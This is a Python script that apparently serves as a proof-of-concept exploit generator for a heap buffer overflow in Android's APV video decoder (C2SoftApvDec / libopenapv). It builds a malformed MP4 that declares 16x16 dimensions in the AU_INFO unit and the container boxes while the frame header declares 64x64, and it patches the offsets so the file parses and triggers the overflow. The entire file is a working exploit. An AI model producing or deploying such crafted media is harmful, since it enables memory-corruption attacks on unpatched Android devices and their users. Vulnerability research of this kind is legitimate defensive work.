#!/usr/bin/env python3
"""
CVE-2026-0006 Exploit MP4 Generator

Creates an MP4 that triggers a heap buffer overflow in Android's APV decoder
(C2SoftApvDec / libopenapv) on pre-March 2026 patch levels.

Attack: AU_INFO PBU declares 16x16 → oapvd_info reports 16x16 → small buffers.
        FRAME PBU header declares 64x64 → oapvd_decode writes 64x64 → overflow.

Prerequisites:
  1. valid.apv in the same directory (64x64 YUV422 10-bit APV bitstream)
  2. apv-mp4/valid_ffmpeg.mp4 baseline created by ffmpeg:
     ffmpeg -f apv -i valid.apv -c copy -y apv-mp4/valid_ffmpeg.mp4

Usage:
  python3 generate_overflow_mp4.py
"""

import os
import struct
import sys

script_dir = os.path.dirname(os.path.abspath(__file__))

apv_path = os.path.join(script_dir, 'valid.apv')
baseline_mp4 = os.path.join(script_dir, 'apv-mp4', 'valid_ffmpeg.mp4')
output_mp4 = os.path.join(script_dir, 'apv-mp4', 'overflow_auinfo.mp4')

if not os.path.exists(apv_path):
    print(f"Error: {apv_path} not found", file=sys.stderr)
    sys.exit(1)

if not os.path.exists(baseline_mp4):
    print(f"Error: {baseline_mp4} not found", file=sys.stderr)
    print(f"Create it first: ffmpeg -f apv -i valid.apv -c copy -y {baseline_mp4}", file=sys.stderr)
    sys.exit(1)

with open(apv_path, 'rb') as f:
    apv = f.read()

original_pbu_data = apv[4:]  # strip AU_SIZE (333 bytes of PBU)

# Build AU_INFO PBU (type 65) claiming 16x16
au_info_payload = b''
au_info_payload += struct.pack('>H', 1)       # num_frames = 1
au_info_payload += bytes([0x01])               # pbu_type = PRIMARY_FRAME
au_info_payload += struct.pack('>H', 1)        # group_id = 1
au_info_payload += bytes([0x00])               # reserved
au_info_payload += bytes([0x21])               # profile_idc
au_info_payload += bytes([0x7B])               # level_idc
au_info_payload += bytes([0x40])               # band_idc(3)=010 + reserved(5)
au_info_payload += bytes([0x00, 0x00, 0x10])  # frame_width = 16
au_info_payload += bytes([0x00, 0x00, 0x10])  # frame_height = 16
au_info_payload += bytes([0x22])               # chroma_format_idc=2 + bit_depth=2
au_info_payload += bytes([0x00])               # capture_time_distance
au_info_payload += bytes([0x00])               # reserved
au_info_payload += bytes([0x00])               # trailing reserved

pbu_header = bytes([65, 0x00, 0x00, 0x00])     # type=65(AU_INFO), group_id=0, reserved=0
pbu_size = len(pbu_header) + len(au_info_payload)
au_info_pbu = struct.pack('>I', pbu_size) + pbu_header + au_info_payload

all_pbu_data = au_info_pbu + original_pbu_data

au_payload_with_sig = b'aPv1' + all_pbu_data
new_au_size = len(au_payload_with_sig)
mdat_data = struct.pack('>I', new_au_size) + au_payload_with_sig

with open(baseline_mp4, 'rb') as f:
    mp4 = bytearray(f.read())

# Patch apvC dimensions to 16x16
apvc_off = mp4.index(b'apvC')
rec_base = apvc_off + 4
struct.pack_into('>I', mp4, rec_base + 12, 16)
struct.pack_into('>I', mp4, rec_base + 16, 16)
print("apvC patched to 16x16")

# Patch apv1 visual sample entry dimensions to 16x16
apv1_off = mp4.index(b'apv1')
vse_w_off = apv1_off + 4 + 6 + 2 + 16
struct.pack_into('>H', mp4, vse_w_off, 16)
struct.pack_into('>H', mp4, vse_w_off + 2, 16)
print("apv1 VSE patched to 16x16")

# Patch tkhd dimensions to 16x16
tkhd_off = mp4.index(b'tkhd')
tkhd_size = struct.unpack('>I', mp4[tkhd_off-4:tkhd_off])[0]
tkhd_end = tkhd_off - 4 + tkhd_size
struct.pack_into('>I', mp4, tkhd_end - 8, 16 << 16)
struct.pack_into('>I', mp4, tkhd_end - 4, 16 << 16)
print("tkhd patched to 16x16")

# Replace mdat with crafted payload
mdat_tag_off = mp4.index(b'mdat')
mdat_box_start = mdat_tag_off - 4
old_mdat_size = struct.unpack('>I', mp4[mdat_box_start:mdat_box_start+4])[0]

new_mdat_box = struct.pack('>I', 8 + len(mdat_data)) + b'mdat' + mdat_data
new_mp4 = bytearray(mp4[:mdat_box_start]) + new_mdat_box + mp4[mdat_box_start+old_mdat_size:]

# Update stsz sample size
stsz_off = new_mp4.index(b'stsz')
stsz_sample_size = struct.unpack('>I', new_mp4[stsz_off+8:stsz_off+12])[0]
if stsz_sample_size != 0:
    struct.pack_into('>I', new_mp4, stsz_off + 8, len(mdat_data))
else:
    struct.pack_into('>I', new_mp4, stsz_off + 16, len(mdat_data))
print(f"stsz updated: sample_size={len(mdat_data)}")

# Update stco chunk offset
stco_off = new_mp4.index(b'stco')
new_chunk_offset = mdat_box_start + 8
struct.pack_into('>I', new_mp4, stco_off + 12, new_chunk_offset)
print(f"stco updated: chunk_offset={new_chunk_offset}")

with open(output_mp4, 'wb') as f:
    f.write(new_mp4)

print(f"\nWritten {len(new_mp4)} bytes to {output_mp4}")
print(f"Container + AU_INFO: 16x16 | FRAME PBU: 64x64 | Overflow: ~14,848 bytes")
